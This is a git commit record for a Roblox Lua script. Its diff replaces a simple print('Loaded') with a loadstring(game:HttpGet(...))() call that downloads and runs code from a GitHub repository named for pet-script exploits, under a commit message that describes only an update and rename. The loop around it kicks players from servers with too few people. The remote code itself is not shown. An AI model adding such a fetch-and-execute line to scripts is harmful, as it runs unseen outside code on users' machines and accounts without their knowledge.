8e73f3ef2c84a09a97f4f3d2822a0fe9e3494ff8
Creambeam <andy.gallagher0714@gmail.com>
2024-12-02 14:08:10 -0600

    Update and rename script2.loadtesting to script2.lua

--- script2.lua
+++ script2.lua
@@ -7,7 +7,7 @@ while true do
             player:Kick("Please use this script in a public server or a server with more than 2 people.")
         end
     else
-        print("Loaded")
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Petscriptexploit/UniversalSH/raw/refs/heads/main/a"))()
         break
     end
 end
